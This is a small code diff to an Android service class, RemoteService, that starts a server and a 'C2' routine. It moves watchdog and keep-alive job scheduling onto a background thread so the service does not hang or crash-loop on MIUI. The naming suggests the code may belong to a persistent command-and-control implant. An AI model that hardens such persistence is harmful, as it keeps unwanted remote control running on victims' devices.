@@ -75,8 +75,15 @@ public class RemoteService extends Service {
         }
         startServer();
         startC2();
-        WatchdogReceiver.schedule(this);
-        KeepAliveJob.schedule(this);
+        // schedule() makes blocking binder calls (JobScheduler / AlarmManager);
+        // under a saturated system_server they can take 10s+ — keep them OFF
+        // the main thread or onStartCommand ANRs and MIUI crash-loops the app
+        Thread sched = new Thread(() -> {
+            WatchdogReceiver.schedule(this);
+            KeepAliveJob.schedule(this);
+        }, "sched-init");
+        sched.setDaemon(true);
+        sched.start();
         return START_STICKY;
     }
 
